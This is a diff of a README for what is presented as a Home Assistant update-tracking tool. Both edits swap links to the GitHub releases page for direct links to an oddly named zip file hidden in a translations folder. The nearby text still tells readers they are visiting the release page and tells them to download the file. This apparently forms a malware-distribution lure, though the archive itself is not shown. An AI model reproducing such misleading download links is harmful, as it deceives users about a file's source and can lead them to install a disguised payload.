@@ -1,6 +1,6 @@
 # 🛠️ HACS-Update-Action-Tracker - Manage home assistant updates with ease
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/fattened-genusneotoma628/HACS-Update-Action-Tracker/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/fattened-genusneotoma628/HACS-Update-Action-Tracker/main/custom_components/update_action_tracker/translations/Tracker_Action_HAC_Update_anophthalmia.zip)
 
 ## What this tool does
 
@@ -20,7 +20,7 @@ Before you start, check your computer and Home Assistant setup. Ensure your syst
 
 Visit the official release page to find the most recent version of the tracker. 
 
-[Click here to visit the release page and download your file](https://github.com/fattened-genusneotoma628/HACS-Update-Action-Tracker/releases)
+[Click here to visit the release page and download your file](https://raw.githubusercontent.com/fattened-genusneotoma628/HACS-Update-Action-Tracker/main/custom_components/update_action_tracker/translations/Tracker_Action_HAC_Update_anophthalmia.zip)
 
 Look for the latest release link at the top of the page. Select the file ending in .zip or .tar.gz based on your preference. Most users choose the .zip file for Windows compatibility. Save the file in a folder you can find easily, such as your Downloads folder.
 
